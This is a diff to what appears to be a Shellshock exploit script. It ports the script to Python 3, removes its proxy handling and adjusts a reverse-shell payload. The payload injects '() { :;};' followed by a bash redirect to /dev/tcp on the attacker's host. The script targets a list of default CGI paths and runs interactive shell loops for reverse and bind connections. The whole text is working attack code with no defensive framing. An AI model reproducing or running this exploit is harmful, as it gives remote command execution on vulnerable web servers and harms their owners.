@@ -67,7 +67,7 @@ if args['payload'] == 'reverse':
 		lhost = args['lhost']
 		lport = int(args['lport'])
 		rhost = args['rhost']
-		payload = "() { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/"+lhost+"/"+str(lport)+" 0>&1 &"
+		payload = "() { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/"+lhost+"/"+str(lport)+" 0>&1 2>&1 &"
 	except:
 		usage()
 elif args['payload'] == 'bind':
@@ -85,11 +85,6 @@ try:
 	pages = args['pages'].split(",")
 except:
 	pages = ["/cgi-sys/entropysearch.cgi","/cgi-sys/defaultwebpage.cgi","/cgi-mod/index.cgi","/cgi-bin/test.cgi","/cgi-bin-sdb/printenv"]
-
-try:
-	proxyhost,proxyport = args['proxy'].split(":")
-except:
-	pass
 
 if args['payload'] == 'reverse':
 	serversocket = socket(AF_INET, SOCK_STREAM)
@@ -115,10 +110,10 @@ while True:
 		clientsocket.settimeout(3)
 		while True:
 			reply = input(f"{clientaddr[0]}> ")
-			clientsocket.sendall(f"{reply}\n")
+			clientsocket.sendall(f"{reply}\n".encode())
 			try:
 				data = clientsocket.recv(buff)
-				print(data)
+				print(data.decode())
 			except:
 				pass
 
@@ -133,8 +128,8 @@ while True:
 			serversocket.settimeout(3)
 			while True:
 				reply = input(f"{rhost}> ")
-				serversocket.sendall(f"{reply}\n")
+				serversocket.sendall(f"{reply}\n".encode())
 				data = serversocket.recv(buff)
-				print(data)
+				print(data.decode())
 		except:
 			pass
